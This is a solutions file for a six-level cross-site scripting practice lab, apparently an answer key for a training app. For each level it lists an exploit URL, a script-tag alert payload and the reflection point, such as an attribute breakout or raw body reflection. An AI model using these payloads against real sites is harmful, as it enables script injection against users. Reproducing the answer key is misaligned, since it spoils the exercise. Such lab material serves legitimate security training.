# multivector — solutions

Multiple sinks/forms/inputs on a single page; identify the reflection point.

### multivector-level1

`/multivector/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: 2nd form input value breakout

### multivector-level2

`/multivector/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw in `<p>` body (script side also injectable with `";...`)

### multivector-level3

`/multivector/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: option value attribute breakout

### multivector-level4

`/multivector/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: 3rd input value attribute breakout

### multivector-level5

`/multivector/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: triple raw reflection — fires in `<div>` body

### multivector-level6

`/multivector/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: deep-nested `<p>` body, raw
